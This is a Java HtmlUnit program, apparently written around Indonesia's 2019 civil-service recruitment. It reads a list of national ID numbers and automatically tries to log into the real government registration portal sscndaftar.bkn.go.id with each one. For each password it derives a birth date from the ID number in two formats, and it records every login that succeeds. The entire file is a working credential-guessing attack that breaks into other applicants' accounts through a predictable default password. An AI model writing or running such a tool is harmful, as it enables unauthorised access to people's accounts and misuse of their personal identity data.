package com.fjr.parigimoutong._2019;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintWriter;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

public class CekLoginParimo2019 {
	
	BufferedReader reader = null; 
	
	PrintWriter out  = null, out1 = null ; 
	
	public CekLoginParimo2019() {
		String content = null; 
		HtmlPage page1 = null;
		WebClient webClient = new WebClient();
		webClient.getCookieManager().clearCookies();
		webClient.getOptions().setJavaScriptEnabled(false);
		webClient.getOptions().setCssEnabled(false);
		try {
			out = new PrintWriter(new FileOutputStream 
					( "E:/birokrasi/lamaran kerja/CPNS 2019/kabupaten parigi moutong/login-sukses.txt"  )); 
			out1 = new PrintWriter(new FileOutputStream 
					("E:/birokrasi/lamaran kerja/CPNS 2019/kabupaten parigi moutong/log.txt"  )); 
					
			reader = new BufferedReader(new FileReader
					( "E:/birokrasi/lamaran kerja/CPNS 2019/kabupaten parigi moutong/daftar-login.txt"   ));
			while((content = reader.readLine() ) != null) {		
				out1.println(content); 
				out1.flush();
				page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
				String nik = content;
				String old_tanggal = convertNikWanita(nik, false); 
				
				HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
				HtmlInput name = form.getInputByName("username"); 

				name.setValueAttribute(nik); 
				HtmlInput passwordForm = form.getInputByName("password"); 
				passwordForm.setValueAttribute(old_tanggal); 
				HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
				HtmlPage page2 = button.click();
				String result = page2.asText(); 
				if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
						! result.toLowerCase().contains("bad credential")) {
					out.println(nik + "|" + old_tanggal);  
					out.flush();
					continue; 
				}

				old_tanggal = convertNikWanita(nik, true); 
				page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
				
				form = (HtmlForm) page1.getElementById("FormLogin"); 
				name = form.getInputByName("username"); 

				name.setValueAttribute(nik); 
				passwordForm = form.getInputByName("password"); 
				passwordForm.setValueAttribute(old_tanggal); 
				button = (HtmlButton) page1.getElementById("btnSimpan"); 
				page2 = button.click();
				result = page2.asText(); 
				if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
						! result.toLowerCase().contains("bad credential")  
						) {
					out.println(nik + "|" + old_tanggal);  
					out.flush();
					continue; 
				}
				
				old_tanggal = "09huiIll"; 
				

			}
		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			if(out != null) {
				out.close();
			}
			if(out1 != null) {
				out1.close();
			}
		}
		
		System.out.println("FINISH"); 
	}
	
	
	public String convertNikWanita(String nik , boolean includeYearPrefix) {
		String nik_ = nik.substring(6,12); 
		int tgl_ktp = Integer.valueOf(nik_.substring(0,2)); 
		if( tgl_ktp > 40) {
			tgl_ktp  = tgl_ktp - 40 ;
		}
		String tgl_ktp_str = Integer.toString(tgl_ktp);
		if(tgl_ktp_str.length() == 1) {
			tgl_ktp_str = "0".concat(tgl_ktp_str);
		}
		String bulan_ktp_str = nik_.substring(2,4); 
		String tahun_ktp_str = nik_.substring(4,6)  ;
		if( includeYearPrefix) {
			tahun_ktp_str = "19".concat( tahun_ktp_str ) ;
		}
		String tgl_final = tgl_ktp_str.concat( bulan_ktp_str ).concat( tahun_ktp_str );
		return tgl_final; 
	}

	public static void main(String[] args) {
		new CekLoginParimo2019(); 
	}
}
